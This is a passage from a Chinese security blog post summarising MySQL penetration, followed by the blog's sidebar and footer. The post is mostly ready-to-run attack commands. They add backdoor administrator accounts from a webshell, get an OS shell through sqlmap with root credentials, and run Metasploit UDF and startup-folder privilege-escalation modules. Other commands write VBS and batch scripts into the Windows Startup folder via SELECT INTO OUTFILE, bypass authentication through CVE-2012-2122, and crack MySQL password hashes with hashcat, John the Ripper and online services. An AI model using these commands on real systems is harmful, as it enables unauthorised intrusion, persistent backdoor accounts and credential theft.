+<h3 id="获取webshell后添加用户命令"><a href="#获取webshell后添加用户命令" class="headerlink" title="获取webshell后添加用户命令"></a>获取webshell后添加用户命令</h3><p>注意如果不能直接执行，则需要到c:\windows\system32\下执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user antian365 www.xianzhi.aliyun.com /add    </span><br><span class="line">net localgroup administrators antian365</span><br></pre></td></tr></table></figure></p>
+<h2 id="sqlmap直连数据库提权"><a href="#sqlmap直连数据库提权" class="headerlink" title="sqlmap直连数据库提权"></a>sqlmap直连数据库提权</h2><p>Sqlmap直接连接数据库提权，需要有写入权限和root账号及密码，命令如下：</p>
+<p>（1）连接数据库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -d <span class="string">"mysql://root:123456@219.115.1.1:3306/mysql"</span> --os-shell</span><br></pre></td></tr></table></figure></p>
+<p>（2）选择操作系统的架构，32位操作系统选择1，64位选择2.</p>
+<p>（3）自动上传udf或提示os-shell</p>
+<p>（4）执行whomai命令如果获取系统权限，则表示提权成功。</p>
+<h3 id="msfudf提权"><a href="#msfudf提权" class="headerlink" title="msfudf提权"></a>msfudf提权</h3><p>Kali渗透测试平台下执行（kali下载地</p>
+<p><a href="https://www.kali.org/downloads/）：" target="_blank" rel="noopener">https://www.kali.org/downloads/）：</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/windows/mysql/mysql_payload</span><br><span class="line">options</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.2.1</span><br><span class="line"><span class="built_in">set</span> rport 3306</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password 123456</span><br><span class="line">run 0或者exploit</span><br></pre></td></tr></table></figure></p>
+<p>msf下udf提权成功率并不高，跟windows操作系统版本，权限和数据库版本有关，特别是secure-file-priv选项，如果有该选项基本不会成功。</p>
+<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><h3 id="创建表并插入vbs脚本到表中"><a href="#创建表并插入vbs脚本到表中" class="headerlink" title="创建表并插入vbs脚本到表中"></a>创建表并插入vbs脚本到表中</h3><p>依次使用以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show databases ;</span><br><span class="line">use <span class="built_in">test</span>;</span><br><span class="line">show tables;</span><br><span class="line">create table a (cmd text); </span><br><span class="line">insert into a values (<span class="string">"set wshshell=createobject ("</span><span class="string">"wscript.shell"</span><span class="string">" ) "</span> ); </span><br><span class="line">insert into a values (<span class="string">"a=wshshell.run ("</span><span class="string">"cmd.exe /c net user aspnetaspnettest/add"</span><span class="string">",0)"</span>) ;</span><br><span class="line">insert into a values (<span class="string">"b=wshshell.run ("</span><span class="string">"cmd.exe /c net localgroup Administrators aspnet /add"</span><span class="string">",0) "</span> ); </span><br><span class="line">select \ from a;</span><br></pre></td></tr></table></figure></p>
+<h3 id="导出vbs脚本到启动"><a href="#导出vbs脚本到启动" class="headerlink" title="导出vbs脚本到启动"></a>导出vbs脚本到启动</h3><p>使用以下命令将刚才在a表中创建的vbs脚本导出到启动选项中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select \ from a into outfile <span class="string">"C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>导入成功后，系统重新启动时会自动添加密码为“1”且用户名称为“1”的用户到管理员组中。在实际使用过程中该脚本成功执行的几率比较低，有时候会出现不能导出的错误.<br>推荐使用以下脚本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show databases ;</span><br><span class="line">use <span class="built_in">test</span>;</span><br><span class="line">show tables;</span><br><span class="line">create table b (cmd text); </span><br><span class="line">insert into b values (<span class="string">"net user Aspnet123545345! /add"</span>);</span><br><span class="line">insert into b values (<span class="string">"net localgroup administrators Aspnet /add"</span>);</span><br><span class="line">insert into b values (<span class="string">"del b.bat"</span>);</span><br><span class="line">select  from b into outfile <span class="string">"C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\b.bat"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>该脚本执行后虽然会闪现Dos窗口，如果有权限导入到启动选项中，则一定会执行成功，在虚拟机中通过MySQL连接器连接并执行以上命令后，在C:\Documents and Settings\All Users\「开始」菜单\程序\启动目录中会有刚才导出的b.bat脚本文件</p>
+<p>说明</p>
+<p>在不同的操作系统中C:\Documents and Settings\All Users\「开始」菜单\程序\启动目录文件名称可能会不同，这个时候就要将其目录换成相应的目录名称即可。例如如果是英文版本操作系统则其插入的代码为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select  from b into outfile <span class="string">"C:\\Documents and Settings</span></span><br></pre></td></tr></table></figure></p>
+<p>Windows 2008 Server的启动目录为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\iis.vbs</span><br></pre></td></tr></table></figure></p>
+<p>其vbs方法可以参考如下写法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table a (cmd text);</span><br><span class="line">insert into a values (<span class="string">"set wshshell=createobject ("</span><span class="string">"wscript.shell"</span><span class="string">" ) "</span> );</span><br><span class="line">insert into a values (<span class="string">"a=wshshell.run ("</span><span class="string">"cmd.exe /c net user antian365 qwer1234!@# /add"</span><span class="string">",0) "</span> );</span><br><span class="line">insert into a values (<span class="string">"b=wshshell.run ("</span><span class="string">"cmd.exe /c net localgroup Administrators antian365 /add"</span><span class="string">",0) "</span> );</span><br><span class="line">select \ from a into outfile <span class="string">"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\iis.vbs"</span>;</span><br></pre></td></tr></table></figure></p>
+<h3 id="msf下模块exploit-windows-mysql-mysql-start-up提权"><a href="#msf下模块exploit-windows-mysql-mysql-start-up提权" class="headerlink" title="msf下模块exploit/windows/mysql/mysql_start_up提权"></a>msf下模块exploit/windows/mysql/mysql_start_up提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_start_up</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.2.1</span><br><span class="line"><span class="built_in">set</span> rport 3306</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password 123456</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>msf下mysql_start_up提权有一定的几率，对英文版系统支持较好。</p>
+<h1 id="Msf其它相关漏洞提权"><a href="#Msf其它相关漏洞提权" class="headerlink" title="Msf其它相关漏洞提权"></a>Msf其它相关漏洞提权</h1><h2 id="Mysql身份认证漏洞及利用-CVE-2012-2122"><a href="#Mysql身份认证漏洞及利用-CVE-2012-2122" class="headerlink" title="Mysql身份认证漏洞及利用(CVE-2012-2122)"></a>Mysql身份认证漏洞及利用(CVE-2012-2122)</h2><p>当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。受影响的产品：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">All MariaDB and MySQL </span><br><span class="line">versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 存在漏洞.</span><br><span class="line">MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23不存在漏洞.</span><br><span class="line">MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not不存在漏洞.</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br></pre></td></tr></table></figure>
+<h2 id="exploit-windows-mysql-mysql-yassl-hello"><a href="#exploit-windows-mysql-mysql-yassl-hello" class="headerlink" title="exploit/windows/mysql/mysql_yassl_hello"></a>exploit/windows/mysql/mysql_yassl_hello</h2><h2 id="exploit-windows-mysql-scrutinizer-upload-exec"><a href="#exploit-windows-mysql-scrutinizer-upload-exec" class="headerlink" title="exploit/windows/mysql/scrutinizer_upload_exec"></a>exploit/windows/mysql/scrutinizer_upload_exec</h2><h1 id="mysql密码破解"><a href="#mysql密码破解" class="headerlink" title="mysql密码破解"></a>mysql密码破解</h1><h2 id="cain工具破解mysql密码"><a href="#cain工具破解mysql密码" class="headerlink" title="cain工具破解mysql密码"></a>cain工具破解mysql密码</h2><p>使用UltraEdit-32编辑器直接打开user.MYD文件，打开后使用二进制模式进行查看，在root用户后面是一串字符串，选中这些字符串将其复制到记事本中，这些字符串即为用户加密值，例如<br>506D1427F6F61696B4501445C90624897266DAE3。</p>
+<p>注意：</p>
+<p>（1）root后面的“”不要复制到字符串中。</p>
+<p>（2）在有些情况下需要往后面看看，否则得到的不是完整的MYSQLSHA1密码，总之其正确的密码位数是40位。安装cain工具，使用cracker，右键单击“Add tolist”将Mysql Hashes值加入到破解列表中，使用软件中的字典、暴力破解等方式来进行暴力破解。</p>
+<h2 id="网站在线密码破解"><a href="#网站在线密码破解" class="headerlink" title="网站在线密码破解"></a>网站在线密码破解</h2><h3 id="cmd5-com破解"><a href="#cmd5-com破解" class="headerlink" title="cmd5.com破解"></a>cmd5.com破解</h3><p>将获取的mysql值放在cmd5.com网站中进行查询，mysql密码一般都是收费的。</p>
+<h3 id="somd5-com破解"><a href="#somd5-com破解" class="headerlink" title="somd5.com破解"></a>somd5.com破解</h3><p>Somd5.com是后面出现的一个免费破解网站，每次破解需要手工选择图形码进行破解，速度快，效果好，只是每次只能破解一个，而且破解一次后需要重新输入验证码。</p>
+<h2 id="oclhash破解"><a href="#oclhash破解" class="headerlink" title="oclhash破解"></a>oclhash破解</h2><p>hashcat支持很多种破解算法，免费开源软件，官方网站<a href="https://hashcat.net/hashcat" target="_blank" rel="noopener">https://hashcat.net/hashcat</a><br>破解命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 200myql.hashpass.dict //破解MySQL323类型</span><br><span class="line">hashcat64.exe -m 300myql.hashpass.dict //破解MySQL4.1/MySQL5类型</span><br></pre></td></tr></table></figure></p>
+<h2 id="John-the-Ripper-password-cracker"><a href="#John-the-Ripper-password-cracker" class="headerlink" title="John the Ripper password cracker"></a>John the Ripper password cracker</h2><p>John the Ripper下载地址：<a href="http://www.openwall.com/john/h/john179w2.zip，John" target="_blank" rel="noopener">http://www.openwall.com/john/h/john179w2.zip，John</a> the Ripper除了能够破解linux外，还能破解多种格式的密码。<br><code>`</code>bash<br>Echo 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B&gt;hashes.txt<br>John –format =mysql-sha1 hashes.txt<br>john –list=formats | grep mysql //查看支持mysql密码破解的算法</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提取/">提取</a>
+</div>
+
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://yoursite.com/2016/01/01/Mysql数据库渗透及漏洞利用总结/" data-title="Mysql数据库渗透及漏洞利用总结 | Bug&#39;小虫" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2016/01/01/dedeCMS常用EXP/" title="dedeCMS常用EXP">
+  <strong>上一篇：</strong><br/>
+  <span>
+  dedeCMS常用EXP</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2016/01/01/Pycharm 增加 Python3的路径/"  title="Pycharm 增加 Python3的路径">
+ <strong>下一篇：</strong><br/> 
+ <span>Pycharm 增加 Python3的路径
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="category-block">
+  <h3 class="asidetitle">分类</h3>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/">SEO</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/反向代理/">反向代理</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/">杂七杂八</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/hexo/">hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/parrot/">parrot</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/windows7/">windows7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">38</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/上传/">上传</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/内网/">内网</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提取/">提取</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提权/">提权</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/端口/">端口</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/Python/">Python</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/逆向工程/">逆向工程</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/逆向工程/mips/">mips</a><span class="category-list-count">1</span></li></ul></li></ul>
+</div>
+
+
+  
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://dillinger.io" target="_blank" title="在线看makedown编译出的效果">makedown</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://mochazz.github.io" target="_blank" title="一个审计大佬的博客">审计</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.php.cn/course/74.html" target="_blank" title="php官方网站">php</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://blog.51cto.com/simeon" target="_blank" title="一个经常发布资源大佬的博客">资源</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.liaoxuefeng.com" target="_blank" title="学习python的个人博客">python</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.kanxue.com" target="_blank" title="二进制安全学习窝">看雪</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="www.secquan.org" target="_blank" title="常混的论坛">圈子</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.2cto.com" target="_blank" title="各种渗透书籍随便挑">红黑联盟</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.cnblogs.com" target="_blank" title="一个内网大佬的博客">linuxsec</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.runoob.com" target="_blank" title="学习各种编程脚本的好地方">W3C</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.91ri.org" target="_blank" title="内网挺可以">91安全</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.kali.org.cn" target="_blank" title="kali linux">kali linux</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.shiyanlou.com" target="_blank" title="实验楼">实验楼</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=b3593ceb&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m Bug`小虫 Page in Google. <br/>
+			This is my blog,believe it or not.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/2176287895" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
+		
+		<a href="/about" target="_blank" title="小虫">小虫</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","bottom":-30,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+ </html>
